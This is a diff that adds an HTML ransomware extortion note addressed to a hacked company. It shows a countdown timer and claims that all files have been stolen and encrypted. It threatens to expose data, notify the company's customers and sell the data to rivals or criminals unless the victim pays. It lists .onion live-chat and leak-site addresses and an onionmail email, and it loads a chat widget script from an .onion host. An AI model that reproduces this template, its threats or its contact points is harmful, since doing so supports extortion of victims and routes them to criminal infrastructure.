@@ -1,0 +1,452 @@
+ï»¿<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<title>sembmarine</title>
+<style>
+a:hover {
+	cursor: pointer;
+}
+
+a:hover {
+	text-decoration: none;
+	background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyMCA0Jz4KPHBhdGggZmlsbD0nbm9uZScgc3Ryb2tlPSdibHVlJyBkPSdNMCAzLjVjNSAwIDUtMyAxMC0zczUgMyAxMCAzIDUtMyAxMC0zIDUgMyAxMCAzJy8+Cjwvc3ZnPgoK") repeat-x 0 100%;
+	background-size: 20px auto;
+	animation: wave0 1s 10 linear;
+}
+
+@keyframes wave0 {
+	0% { background-position: 0 100%; }
+	100% { background-position: -20px 100%; }
+}
+
+
+
+pre{
+	border: 4px solid #d6d6d6;
+	border-radius: 7px;
+	padding: 0px;
+	margin-right: 0.5em;
+}
+
+code{
+	font-family: Monaco, Consolas, Monospace, Courier;
+	border-radius: 4px;
+}
+
+.CLS_InlineCode{
+	background-color: DarkCyan;
+	color: white;
+	padding: 2px 4px;
+	margin: 0px 3px;
+	font-family: Monaco, Consolas, Monospace, Courier;
+}
+
+.CLS_LiteralDollars{
+	background-color: default;
+	padding: default;
+	margin: default;
+	border-radius: 0;
+}
+
+
+
+table{
+	border-collapse: collapse;
+	border: 1px solid gray;
+	border-width: 2px 1px 2px 1px;
+	margin-right: 1em;
+}
+
+th{
+	border: 1px solid gray;
+	padding: 4px;
+	background-color: #ddd;
+}
+
+td{
+	border: 1px solid gray;
+	padding: 4px;
+}
+
+tr{
+	background-color: #f0f0f0;
+}
+
+tr:nth-child(2n){
+	background-color: #f8f8f8;
+}
+
+
+
+.CLS_THREAD {
+	color: blue;
+	background-color: #e8e8e8;
+	
+}
+
+.CLS_THREAD:hover {
+	cursor: pointer;
+}
+
+.CLS_THREAD:hover {
+	text-decoration: none;
+	background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyMCA0Jz4KPHBhdGggZmlsbD0nbm9uZScgc3Ryb2tlPSdibHVlJyBkPSdNMCAzLjVjNSAwIDUtMyAxMC0zczUgMyAxMCAzIDUtMyAxMC0zIDUgMyAxMCAzJy8+Cjwvc3ZnPgoK") repeat-x 0 100%;
+	background-size: 20px auto;
+	animation: wave0 1s infinite linear;
+}
+
+
+
+#ID_NYF_TOC_PANE {
+	margin: 0px;
+	padding: 0px;
+	border: 1px solid black;
+	border-radius: 3px;
+	background-color: lightyellow;
+	opacity: 0.8;
+}
+
+.CLS_NYF_TOC_LISTITEM {
+}
+
+.CLS_NYF_TOC_HREF {
+	font-size: small;
+	text-decoration: underline;
+	line-height: 150%;
+}
+
+
+
+body, table{font-family: "Tahoma"; font-size: 9pt}
+
+
+
+a {
+	color: #0366e6;
+	text-decoration: none;
+}
+
+a:hover {
+	
+}
+
+blockquote {
+	margin-left: 1em;
+	border-left: 6px solid #ddd;
+	padding-left: 3px;
+	color: #777;
+}
+
+hr {
+	border: 0;
+	border-bottom: 1px solid #ddd;
+}
+
+pre {
+
+}
+
+code {
+
+}
+
+p {
+
+}
+
+div {
+
+}
+
+h1 {
+
+}
+
+h2 {
+
+}
+
+h3 {
+
+}
+
+h4 {
+
+}
+
+h5 {
+
+}
+
+h6 {
+
+}
+
+table{
+
+}
+
+th{
+
+}
+
+td{
+
+}
+
+tr{
+
+}
+
+tr:nth-child(2n){
+
+}
+
+
+
+.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 0.5em;
+  background: #F0F0F0;
+}
+
+
+
+
+.hljs,
+.hljs-subst {
+  color: #444;
+}
+
+.hljs-comment {
+  color: #888888;
+}
+
+.hljs-keyword,
+.hljs-attribute,
+.hljs-selector-tag,
+.hljs-meta-keyword,
+.hljs-doctag,
+.hljs-name {
+  font-weight: bold;
+}
+
+
+
+
+.hljs-type,
+.hljs-string,
+.hljs-number,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-quote,
+.hljs-template-tag,
+.hljs-deletion {
+  color: #880000;
+}
+
+.hljs-title,
+.hljs-section {
+  color: #880000;
+  font-weight: bold;
+}
+
+.hljs-regexp,
+.hljs-symbol,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-link,
+.hljs-selector-attr,
+.hljs-selector-pseudo {
+  color: #BC6060;
+}
+
+
+
+
+.hljs-literal {
+  color: #78A960;
+}
+
+.hljs-built_in,
+.hljs-bullet,
+.hljs-code,
+.hljs-addition {
+  color: #397300;
+}
+
+
+
+
+.hljs-meta {
+  color: #1f7199;
+}
+
+.hljs-meta-string {
+  color: #4d99bf;
+}
+
+
+
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+</style>
+</head>
+<body>
+<script>
+    var timer=(function(){
+        return function (json){
+                var endtime=new Date(json.endtime);
+                var nowtime = new Date();
+                var lefttime=parseInt((endtime.getTime()-nowtime.getTime())/1000);
+                d=parseInt(lefttime/3600/24);
+                h=parseInt((lefttime/3600)%24);
+                m=parseInt((lefttime/60)%60);
+                s=parseInt(lefttime%60);
+                document.getElementById(json.objId).innerHTML=d+" day "+h+" hour "+m+" min "+s+" sec ";
+                if(lefttime>0){setTimeout(function(){timer(json)},1000);}
+        }
+    })()
+        window.onload=function(){
+            timer({
+                objId:'countDown',
+                endtime:"4/21/2022,24:00"
+            })
+        }
+</script>
+<script type="application/javascript">
+        window.tiledeskSettings= 
+        {
+            projectid: "6252787d842899001a6479bf"
+        };
+        (function(d, s, id) { 
+            var w=window; var d=document; var i=function(){i.c(arguments);};
+            i.q=[]; i.c=function(args){i.q.push(args);}; w.Tiledesk=i;                    
+            var js, fjs=d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) return;
+            js=d.createElement(s); 
+            js.id=id; js.async=true; js.src="http://v63faxvtafuaph5nvnp4gvpy4rtamjvnlks5gsqn2r6e4uv3lehmiead.onion/widget/launch.js";
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document,'script','tiledesk-jssdk'));
+    </script>
+<article>
+	<h1 id="nyf_bkmk_29a35e3a"><center><span style="color: black; font-size: 30pt">Cheers!</span></center>
+	</h1>
+	<hr />
+	<h1 id="thetimeleft"><center><span style="color: RED; font-size: 20pt">The time left: <span id="countDown"></span></span></center>
+	</h1>
+	<hr />
+	<h2 id="securityalert"><span style="color: RED;">Security Alert!!!</span>
+	</h2>
+	<ul>
+		<li>
+			<h4 id="wehackedyourcompanysuccessfully">We hacked your company successfully
+			</h4>
+		</li>
+		<li>
+			<h4 id="allfileshavebeenstolenandencryptedbyus">All files have been stolen and encrypted by us
+			</h4>
+		</li>
+		<li>
+			<h4 id="ifyouwanttorestorefilesoravoidfileleakspleasecontactus">If you want to restore files or avoid file leaks, please contact us
+			</h4>
+		</li>
+	</ul>
+	<hr />
+	<h2 id="nyf_bkmk_49b66b6a"><span style="color: RED;">Attention!!!</span>
+	</h2>
+	<ul>
+		<li>
+			<h4 id="contactuswithin3daysotherwisewewillexposesomedataandraisetheprice">Contact us within 3 days, otherwise we will expose some data and raise the price
+			</h4>
+		</li>
+		<li>
+			<h4 id="donttrytodecryptimportantfilesitmaydamageyourfiles">Don&apos;t try to decrypt important files, it may damage your files
+			</h4>
+		</li>
+		<li>
+			<h4 id="donttrustwhocandecrypttheyareliarsnoonecandecryptwithoutkeyfile">Don&apos;t trust who can decrypt, they are liars,no one can decrypt without key file
+			</h4>
+		</li>
+		<li>
+			<h4 id="ifyoudontcontactuswewillnotifyyourcustomersofthedatabreachbyemailandtextmessage">If you don&apos;t contact us, we will notify your customers of the data breach by email and text message
+			</h4>
+		</li>
+		<li>
+			<h4 id="andsellyourdatatoyouropponentsorcriminalsdatamaybemaderelease">And sell ââyour data to your opponents or criminals, data may be made release
+			</h4>
+		</li>
+	</ul>
+	<hr />
+	<h2 id="nyf_bkmk_3ed7a8c2"><span style="color: RED;">Information<br /></span>
+	</h2>
+	<h3 id="websitelivechatandemailaddress">Web Site Live Chat&nbsp; &nbsp; And Email Address
+	</h3>
+	<ul>
+		<li>
+			<h4 id="youcanvisitthissiteandcontactusthroughwidgetsorgetouremailaddressfromthissite">You can visit this site and contact us through widgets or get our email address from this siteï¼
+			</h4>
+			<blockquote>
+				<p>http://crkfkmrh4qzbddfrl2axnkvjp5tgwx73d7lq4oycsfxc7pfgbfhtfiid.onion<br />
+				</p><br />Email:Thomas.Sebastian@onionmail.org
+			</blockquote>
+		</li>
+	</ul>
+	<h3 id="datareleasesite">Data Release Site
+	</h3>
+	<ul>
+		<li>
+			<h4 id="ifyoudontpayandnoonewantstobuyyourdataitwillappearhere">If you don&apos;t pay and no one wants to buy your data, it will appear here
+			</h4>
+			<blockquote>
+				<p>http://rwiajgajdr4kzlnrj5zwebbukpcbrjhupjmk6gufxv6tg7myx34iocad.onion
+				</p>
+			</blockquote>
+		</li>
+	</ul>
+	<hr />
+	<h2 id="nyf_bkmk_2fed584a"><span style="color: RED;">Notice</span>
+	</h2>
+	<ul>
+		<li>Can all files be decrypted?
+			<blockquote>
+				<p>Of course, you can provide us with a few encrypted files for free decryption as a test
+				</p>
+			</blockquote>
+		</li>
+		<li>How to access URLs with .onion suffix or how to open darkweb site?
+			<blockquote>
+				<p>https://<a href="http://www.comparitech.com/blog/vpn-privacy/access-dark-web-safely-vpn/">www.comparitech.com/blog/vpn-privacy/access-dark-web-safely-vpn/</a>
+				</p>
+			</blockquote>
+		</li>
+		<li>Or watch this video:
+			<blockquote>
+				<p>https://<a href="http://www.youtube.com/watch?v=4pIi9yTWuRw">www.youtube.com/watch?v=4pIi9yTWuRw</a>
+				</p>
+			</blockquote>
+		</li>
+		<li>Why no live web chat on the web?
+			<blockquote>
+				<p>The page is slow to load, please wait a while,&nbsp; icon will appear in the lower right corner
+				</p>
+			</blockquote>
+		</li>
+		<li>Why is there no reply after the email is sent?
+			<blockquote>
+				<p>Maybe the mailbox has been disabled, we will update the email address within 12 hours
+				</p>
+			</blockquote>
+		</li>
+	</ul>
+</article>
+</body>
+</html>
